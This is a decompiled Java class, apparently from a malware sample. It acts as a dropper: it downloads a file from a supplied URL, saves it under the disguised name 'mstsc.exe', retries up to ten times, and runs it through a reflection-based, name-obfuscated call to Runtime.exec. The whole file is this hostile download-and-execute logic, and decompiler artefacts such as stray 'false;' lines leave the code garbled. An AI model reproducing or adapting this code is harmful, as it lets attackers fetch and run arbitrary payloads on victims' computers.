import java.io.InputStream;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.net.URL;

// 
// Decompiled by Procyon v0.5.30
// 

class h6l4 implements Runnable
{
    public String x_url;
    public String ename;
    
    public h6l4(final String x_url) {
        this.x_url = x_url;
    }
    
    @Override
    public void run() {
        this.__S(0);
    }
    
    public void __S(int n) {
        final StringBuilder sb = new StringBuilder();
        sb.append("mstsc");
        sb.append(".exe");
        false;
        final String string = sb.toString();
        __p();
        false;
        false;
        false;
        false;
        StringBuilder sb2;
        try {
            final String x_url = this.x_url;
            false;
            final URLConnection openConnection = new URL(x_url).openConnection();
            false;
            final InputStream inputStream = openConnection.getInputStream();
            sb2 = new StringBuilder();
            sb2.append(string);
            final FileOutputStream fileOutputStream = new FileOutputStream(sb2.toString());
            false;
            final byte[] array = new byte[1024];
            false;
            false;
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
                false;
            }
            inputStream.close();
            false;
            fileOutputStream.close();
        }
        catch (Exception ex2) {
            ++n;
            false;
            if (n < 10) {
                this.__S(n);
                false;
            }
            return;
        }
        try {
            final String string2 = sb2.toString();
            false;
            __u(string2);
        }
        catch (Exception ex) {
            System.out.println("Exec : " + ex.getMessage());
        }
    }
    
    public static void __u(final String s) {
        try {
            final Runtime runtime = Runtime.getRuntime();
            false;
            Class.forName("java.lang.Runtime").getMethod(main.coder(" 6&,"), String.class).invoke(runtime, s);
        }
        catch (Exception ex) {}
    }
    
    private static String __p() {
        return System.getProperty("java.io.tmpdir");
    }
}
